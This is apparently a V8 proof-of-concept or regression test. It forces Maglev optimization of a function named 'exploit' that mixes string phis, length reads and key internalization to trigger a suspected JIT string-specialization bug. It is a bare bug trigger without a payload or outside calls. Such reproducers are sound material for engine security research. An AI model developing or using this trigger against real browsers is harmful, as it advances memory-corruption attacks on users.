// Flags: --specialize-code-for-one-byte-seq-strings --allow-natives-syntax --debug-code

let s1 = "A".repeat(10);
let s2 = "B".repeat(10);
let s1_content = "A".repeat(10);

function side_effect() {
  let obj = {};
  obj[s1_content] = 1;
  obj[s1] = 2; 
}

function exploit(cond, s1_arg, s2_arg) {
  let l1 = s1_arg.length;
  let l2 = s2_arg.length;
  
  let phi = cond ? s1_arg : s2_arg;
  
  phi.charCodeAt(0);
  let l3 = phi.length;
  
  side_effect();
  
  return phi.charCodeAt(0);
}

%PrepareFunctionForOptimization(exploit);
exploit(false, s1, s2);
exploit(false, s1, s2);

s1 = "A".repeat(10);
s1_content = "A".repeat(10);
%OptimizeMaglevOnNextCall(exploit);
let res = exploit(true, s1, s2);
print("Result: " + res);
